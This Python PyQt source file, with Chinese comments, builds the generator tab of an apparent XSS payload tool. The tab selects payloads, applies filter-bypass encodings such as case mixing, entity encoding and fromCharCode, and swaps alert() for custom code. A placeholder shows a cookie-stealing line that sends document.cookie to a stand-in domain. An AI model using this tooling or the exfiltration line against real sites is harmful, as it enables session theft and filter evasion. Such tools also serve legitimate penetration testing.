"""
Payload生成器标签页 - 完全按照原版实现
"""
from gui import *


class GeneratorTab(QWidget):
    """Payload生成器标签页"""

    def __init__(self, parent=None):
        super().__init__(parent)
        self.parent_window = parent
        self.init_ui()

    def init_ui(self):
        """初始化界面 - 左右布局"""
        main_layout = QHBoxLayout(self)
        main_layout.setContentsMargins(20, 20, 20, 20)
        main_layout.setSpacing(20)

        # 左侧：Payload选择区域 (40%)
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        left_layout.setContentsMargins(0, 0, 0, 0)
        left_layout.setSpacing(15)

        # 搜索框
        self.search_input = QLineEdit()
        self.search_input.setPlaceholderText("搜索Payload...")
        self.search_input.setStyleSheet("padding: 10px; font-size: 13px;")
        self.search_input.textChanged.connect(self.filter_payloads)
        left_layout.addWidget(self.search_input)

        # 分类列表
        self.cat_label = QLabel("分类")
        self.cat_label.setStyleSheet("font-weight: 400; font-size: 13px; color: #303133;")
        left_layout.addWidget(self.cat_label)

        self.category_list = QListWidget()
        if self.parent_window and hasattr(self.parent_window, 'payload_manager'):
            categories = self.parent_window.payload_manager.get_all_categories()
            self.category_list.addItems(categories)
        self.category_list.setCurrentRow(0)
        self.category_list.currentItemChanged.connect(self.on_category_changed)
        self.category_list.setMinimumHeight(180)
        self.category_list.setMaximumHeight(250)
        self.category_list.setFocusPolicy(Qt.NoFocus)
        left_layout.addWidget(self.category_list)

        # Payload列表
        self.payload_label = QLabel("Payload")
        self.payload_label.setStyleSheet("font-weight: 400; font-size: 13px; color: #303133;")
        left_layout.addWidget(self.payload_label)

        self.payload_list = QListWidget()
        self.payload_list.currentItemChanged.connect(self.on_payload_list_changed)
        self.payload_list.setFocusPolicy(Qt.NoFocus)
        left_layout.addWidget(self.payload_list)

        main_layout.addWidget(left_panel, 2)

        # 右侧：配置和结果区域 (60%)
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        right_layout.setContentsMargins(0, 0, 0, 0)
        right_layout.setSpacing(15)

        # 自定义代码
        custom_group = QGroupBox("自定义执行代码")
        custom_layout = QVBoxLayout()
        custom_layout.setSpacing(10)

        self.custom_input = QLineEdit()
        self.custom_input.setPlaceholderText('例如: fetch("http://your-domain.com/?c="+document.cookie)')
        self.custom_input.setStyleSheet("padding: 10px; font-size: 13px;")
        custom_layout.addWidget(self.custom_input)

        apply_btn = QPushButton("应用")
        apply_btn.clicked.connect(self.apply_custom)
        apply_btn.setStyleSheet("padding: 8px 20px;")
        custom_layout.addWidget(apply_btn)

        custom_group.setLayout(custom_layout)
        right_layout.addWidget(custom_group)

        # 绕过策略
        bypass_group = QGroupBox("绕过策略")
        bypass_layout = QGridLayout()
        bypass_layout.setSpacing(10)

        self.bypass_checks = []
        bypass_methods = ["大小写混淆", "双写绕过", "HTML实体编码", "HTML命名实体",
                         "URL编码全部", "注释插入", "换行符", "Tab符",
                         "斜杠分隔", "反引号替换", "无引号", "字符串拼接", "fromCharCode"]

        for i, method in enumerate(bypass_methods):
            check = CustomCheckBox(method)
            self.bypass_checks.append(check)
            bypass_layout.addWidget(check, i // 4, i % 4)

        bypass_group.setLayout(bypass_layout)
        right_layout.addWidget(bypass_group)

        # 操作按钮
        btn_layout = QHBoxLayout()
        btn_layout.setSpacing(10)

        gen_btn = QPushButton("生成")
        gen_btn.clicked.connect(self.generate)
        gen_btn.setStyleSheet("padding: 10px 25px;")
        btn_layout.addWidget(gen_btn)

        copy_btn = QPushButton("复制")
        copy_btn.clicked.connect(self.copy_result)
        copy_btn.setStyleSheet("padding: 10px 20px;")
        btn_layout.addWidget(copy_btn)

        export_btn = QPushButton("导出")
        export_btn.clicked.connect(self.export_to_file)
        export_btn.setStyleSheet("padding: 10px 20px;")
        btn_layout.addWidget(export_btn)

        clear_btn = QPushButton("清空")
        clear_btn.clicked.connect(self.clear_result)
        clear_btn.setStyleSheet("padding: 10px 20px;")
        btn_layout.addWidget(clear_btn)

        btn_layout.addStretch()
        right_layout.addLayout(btn_layout)

        # 结果显示
        result_group = QGroupBox("生成的Payload")
        result_layout = QVBoxLayout()

        self.result_text = QTextEdit()
        self.result_text.setPlaceholderText('选择Payload后自动预览')
        self.result_text.setStyleSheet("padding: 12px; font-size: 13px;")
        self.result_text.setFocusPolicy(Qt.NoFocus)
        result_layout.addWidget(self.result_text)

        self.length_label = QLabel("长度: 0")
        self.length_label.setStyleSheet("color: #606266; padding: 5px;")
        result_layout.addWidget(self.length_label)

        result_group.setLayout(result_layout)
        right_layout.addWidget(result_group)

        main_layout.addWidget(right_panel, 3)

        # 初始化
        self.update_payloads()

    def update_payloads(self):
        """更新payload列表"""
        self.on_category_changed(self.category_list.currentItem(), None)

    def on_category_changed(self, current, previous):
        """分类改变时更新payload列表"""
        if not current:
            return

        if self.parent_window and hasattr(self.parent_window, 'payload_manager'):
            category = current.text()
            payloads = self.parent_window.payload_manager.get_payloads_by_category(category)

            self.payload_list.clear()
            for name in payloads.keys():
                self.payload_list.addItem(name)

    def on_payload_list_changed(self, current, previous):
        """Payload选择改变时自动预览"""
        if not current:
            return

        if self.parent_window and hasattr(self.parent_window, 'payload_manager'):
            category_item = self.category_list.currentItem()
            if category_item:
                category = category_item.text()
                payloads = self.parent_window.payload_manager.get_payloads_by_category(category)
                payload_name = current.text()

                if payload_name in payloads:
                    payload = payloads[payload_name]
                    self.result_text.setPlainText(payload)
                    self.length_label.setText(f"长度: {len(payload)}")

    def filter_payloads(self, text):
        """搜索过滤payload"""
        search_text = text.lower()

        for i in range(self.payload_list.count()):
            item = self.payload_list.item(i)
            if search_text in item.text().lower():
                item.setHidden(False)
            else:
                item.setHidden(True)

    def apply_custom(self):
        """应用自定义代码"""
        custom_code = self.custom_input.text().strip()
        if not custom_code:
            QMessageBox.warning(self, '提示', '请输入自定义代码')
            return

        current_payload = self.result_text.toPlainText()
        if not current_payload:
            QMessageBox.warning(self, '提示', '请先选择一个Payload')
            return

        # 替换alert(1)为自定义代码
        import re
        modified = re.sub(r'alert\([^)]*\)', custom_code, current_payload)

        self.result_text.setPlainText(modified)
        self.length_label.setText(f"长度: {len(modified)}")

        if self.parent_window:
            self.parent_window.statusBar().showMessage('已应用自定义代码', 2000)

    def generate(self):
        """生成带绕过策略的payload"""
        current_payload = self.result_text.toPlainText()
        if not current_payload:
            QMessageBox.warning(self, '提示', '请先选择一个Payload')
            return

        # 获取选中的绕过策略
        selected = [check.text() for check in self.bypass_checks if check.isChecked()]

        # 检测策略冲突
        conflicts = self.check_bypass_conflicts(selected)
        if conflicts:
            reply = QMessageBox.question(
                self,
                '策略冲突',
                f'以下策略可能冲突，导致无效payload:\n\n{conflicts}\n\n是否继续生成？',
                QMessageBox.Yes | QMessageBox.No
            )
            if reply == QMessageBox.No:
                return

        # 使用generator的_apply_bypass方法应用策略
        result = current_payload
        if self.parent_window and hasattr(self.parent_window, 'payload_manager'):
            generator = self.parent_window.payload_manager.generator
            for option in selected:
                result = generator._apply_bypass(result, option)

        self.result_text.setPlainText(result)
        self.length_label.setText(f"长度: {len(result)}")

        # 添加到历史
        if self.parent_window and hasattr(self.parent_window, 'add_to_history'):
            category_item = self.category_list.currentItem()
            if category_item:
                self.parent_window.add_to_history(category_item.text(), result)

        if self.parent_window:
            self.parent_window.statusBar().showMessage('已生成', 2000)

    def check_bypass_conflicts(self, selected):
        """检测绕过策略冲突"""
        conflicts = []

        # 冲突组：这些策略不应该同时使用
        conflict_groups = [
            {
                "strategies": ["无引号", "字符串拼接"],
                "reason": "无引号会删除字符串拼接添加的引号"
            },
            {
                "strategies": ["反引号替换", "字符串拼接"],
                "reason": "反引号和字符串拼接语法不兼容"
            },
            {
                "strategies": ["HTML实体编码", "URL编码全部"],
                "reason": "两种编码会互相干扰"
            },
            {
                "strategies": ["HTML命名实体", "URL编码全部"],
                "reason": "两种编码会互相干扰"
            },
            {
                "strategies": ["HTML实体编码", "HTML命名实体"],
                "reason": "两种实体编码会互相覆盖事件处理器代码"
            },
            {
                "strategies": ["HTML命名实体", "fromCharCode"],
                "reason": "编码会破坏fromCharCode语法"
            },
            {
                "strategies": ["fromCharCode", "HTML实体编码"],
                "reason": "编码会破坏fromCharCode语法"
            },
        ]

        for group in conflict_groups:
            found = [s for s in group["strategies"] if s in selected]
            if len(found) >= 2:
                conflicts.append(f"• {' + '.join(found)}: {group['reason']}")

        return '\n'.join(conflicts) if conflicts else None

    def copy_result(self):
        """复制结果"""
        text = self.result_text.toPlainText()
        if text:
            QApplication.clipboard().setText(text)
            if self.parent_window:
                self.parent_window.statusBar().showMessage('已复制', 2000)

    def export_to_file(self):
        """导出到文件"""
        text = self.result_text.toPlainText()
        if not text:
            QMessageBox.warning(self, '提示', '没有可导出的内容')
            return

        filename, _ = QFileDialog.getSaveFileName(self, '导出Payload', 'payload.txt', 'Text Files (*.txt)')
        if filename:
            try:
                with open(filename, 'w', encoding='utf-8') as f:
                    f.write(text)
                if self.parent_window:
                    self.parent_window.statusBar().showMessage(f'已导出到: {filename}', 3000)
            except:
                QMessageBox.warning(self, '错误', '导出失败')

    def clear_result(self):
        """清空结果"""
        self.result_text.clear()
        self.length_label.setText("长度: 0")
        if self.parent_window:
            self.parent_window.statusBar().showMessage('已清空', 2000)
